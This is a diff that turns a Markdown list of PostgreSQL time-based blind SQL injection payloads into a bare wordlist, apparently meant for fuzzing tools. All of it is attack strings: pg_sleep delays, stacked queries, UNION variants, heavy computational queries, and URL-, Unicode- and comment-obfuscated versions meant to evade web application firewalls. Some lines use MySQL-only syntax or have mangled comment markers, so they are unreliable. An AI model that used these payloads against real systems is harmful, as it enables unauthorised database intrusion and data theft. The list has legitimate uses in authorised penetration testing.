@@ -1,103 +1,49 @@
-# PostgreSQL
-
-These payloads cause time delays to prove interaction via injection. Variations include case changes, comments, encodings (URL, double URL, Unicode), inline spaces/comments, and WAF bypass tricks like nested functions or heavy computations.
-
-- **' AND pg_sleep(5) --**  
-  Standard PG_SLEEP 5 seconds.
-- **'; pg_sleep(5) --**  
-  Semicolon stacked PG_SLEEP.
-- **' AND (CASE WHEN 1=1 THEN pg_sleep(5) ELSE 0 END) --**  
-  CASE conditional PG_SLEEP.
-- **' aNd Pg_SlEeP(5) --**  
-  Case variation PG_SLEEP.
-- **'/*comment*/AND/*comment*/pg_sleep(5) --**  
-  Inline comments PG_SLEEP.
-- **%27%20AND%20pg_sleep(5)%20--**  
-  URL-encoded PG_SLEEP.
-- **%2527%20AND%20pg_sleep(5)%20--**  
-  Double URL PG_SLEEP.
-- **\u0027 AND pg_sleep(5) --**  
-  Unicode PG_SLEEP.
-- **' OR pg_sleep(5) --**  
-  OR PG_SLEEP delay.
-- **' UNION SELECT pg_sleep(5) --**  
-  UNION PG_SLEEP.
-- **' HAVING pg_sleep(5) --**  
-  HAVING PG_SLEEP.
-- **' ORDER BY pg_sleep(5) --**  
-  ORDER BY PG_SLEEP.
-- **' GROUP BY pg_sleep(5) --**  
-  GROUP BY PG_SLEEP.
-- **' AND generate_series(1,1000000) --**  
-  Generate series heavy loop.
-- **' AND (SELECT 1 FROM generate_series(1,1000000)) --**  
-  Subquery series.
-- **' AND pg_sleep/* */(5) --**  
-  Comment in function.
-- **' AND pg_ sleep(5) --**  
-  Spaced PG_SLEEP.
-- **' AND/**/pg_sleep(5)/**/ --**  
-  Full comment wrap.
-- **' AND pg_sleep(5)--**  
-  Dash comment PG_SLEEP.
-- **' AND pg_sleep(5)#**  
-  Hash comment PG_SLEEP.
-- **%27%20OR%20pg_sleep(5)%20--**  
-  URL OR PG_SLEEP.
-- **' AND 1=(pg_sleep(5)) --**  
-  Assignment PG_SLEEP.
-- **' AND pg_sleep(5) AND '1'='1**  
-  Chained PG_SLEEP.
-- **' UNION ALL SELECT pg_sleep(5) --**  
-  UNION ALL PG_SLEEP.
-- **' AND (SELECT * FROM (SELECT pg_sleep(5))a) --**  
-  Nested subquery PG_SLEEP.
-- **\u0027\u0020AND\u0020pg_sleep(5)\u0020--**  
-  Unicode spaced.
-- **' AND pg_sleep(5) /*' or pg_sleep(5) or '" or pg_sleep(5) or "*/**  
-  Multi-comment bypass.
-- **' AND clock_timestamp() > clock_timestamp() + INTERVAL '5 seconds' --**  
-  INTERVAL time check heavy.
-- **' AND EXTRACT(EPOCH FROM INTERVAL '5')=pg_sleep(5) --**  
-  EXTRACT nested PG_SLEEP.
-- **' AND pg_sleep(5) RLIKE pg_sleep(5) --**  
-  RLIKE nested.
-- **' PROCEDURE ANALYSE(pg_sleep(5),1) --**  
-  PROCEDURE PG_SLEEP.
-- **' AND (SELECT COUNT(*) FROM information_schema.tables LIMIT 1 OFFSET pg_sleep(5)) --**  
-  OFFSET nested PG_SLEEP.
-- **%27+AND+pg_sleep(5)+--**  
-  Plus-space variant.
-- **' AND pg_sleep(concat(5)) --**  
-  CONCAT param.
-- **' AND 1=pg_sleep(5) --**  
-  Direct equality PG_SLEEP.
-- **' OR (pg_sleep(5))=0 --**  
-  OR assignment.
-- **%2527%20AND%20pg_sleep%285%29%20--**  
-  Double URL param.
-- **' AND pg_sleep(5)--+**  
-  Plus dash comment.
-- **' AND pg_sleep(5)='**  
-  Incomplete string.
-- **' AND pg_sleep(10) --**  
-  Longer 10-second delay.
-- **' AND generate_series(pg_sleep(1),5) --**  
-  Series with PG_SLEEP.
-- **' AND (pg_sleep(5)) IS NULL --**  
-  IS NULL PG_SLEEP.
-- **'; SELECT pg_sleep(5); --**  
-  Stacked SELECT PG_SLEEP.
-- **' UNION SELECT NULL, pg_sleep(5) --**  
-  UNION NULL PG_SLEEP.
-- **' AND 1::int=pg_sleep(5) --**  
-  Cast nested.
-- **' AND CAST(pg_sleep(5) AS text) --**  
-  CAST PG_SLEEP.
-- **' AND (SELECT COUNT(*) FROM pg_class c1, pg_class c2) --**  
-  PG_CLASS cross-join.
-- **' AND repeat('a',1000000) --**  
-  REPEAT string heavy.
-- **' AND (SELECT string_agg(id::text, '') FROM generate_series(1,100000)) --**  
-  String_agg heavy.
-
+' AND pg_sleep(5) --
+'; pg_sleep(5) --
+' AND (CASE WHEN 1=1 THEN pg_sleep(5) ELSE 0 END) --
+' aNd Pg_SlEeP(5) --
+'/comment/AND/comment/pg_sleep(5) --
+%27%20AND%20pg_sleep(5)%20--
+%2527%20AND%20pg_sleep(5)%20--
+\u0027 AND pg_sleep(5) --
+' OR pg_sleep(5) --
+' UNION SELECT pg_sleep(5) --
+' HAVING pg_sleep(5) --
+' ORDER BY pg_sleep(5) --
+' GROUP BY pg_sleep(5) --
+' AND generate_series(1,1000000) --
+' AND (SELECT 1 FROM generate_series(1,1000000)) --
+' AND pg_sleep/* */(5) --
+' AND pg_ sleep(5) --
+' AND//pg_sleep(5)// --
+' AND pg_sleep(5)--
+' AND pg_sleep(5)#
+%27%20OR%20pg_sleep(5)%20--
+' AND 1=(pg_sleep(5)) --
+' AND pg_sleep(5) AND '1'='1
+' UNION ALL SELECT pg_sleep(5) --
+' AND (SELECT * FROM (SELECT pg_sleep(5))a) --
+\u0027\u0020AND\u0020pg_sleep(5)\u0020--
+' AND pg_sleep(5) /' or pg_sleep(5) or '" or pg_sleep(5) or "/
+' AND clock_timestamp() > clock_timestamp() + INTERVAL '5 seconds' --
+' AND EXTRACT(EPOCH FROM INTERVAL '5')=pg_sleep(5) --
+' AND pg_sleep(5) RLIKE pg_sleep(5) --
+' PROCEDURE ANALYSE(pg_sleep(5),1) --
+' AND (SELECT COUNT(*) FROM information_schema.tables LIMIT 1 OFFSET pg_sleep(5)) --
+%27+AND+pg_sleep(5)+--
+' AND pg_sleep(concat(5)) --
+' AND 1=pg_sleep(5) --
+' OR (pg_sleep(5))=0 --
+%2527%20AND%20pg_sleep%285%29%20--
+' AND pg_sleep(5)--+
+' AND pg_sleep(5)='
+' AND pg_sleep(10) --
+' AND generate_series(pg_sleep(1),5) --
+' AND (pg_sleep(5)) IS NULL --
+'; SELECT pg_sleep(5); --
+' UNION SELECT NULL, pg_sleep(5) --
+' AND 1::int=pg_sleep(5) --
+' AND CAST(pg_sleep(5) AS text) --
+' AND (SELECT COUNT(*) FROM pg_class c1, pg_class c2) --
+' AND repeat('a',1000000) --
+' AND (SELECT string_agg(id::text, '') FROM generate_series(1,100000)) --
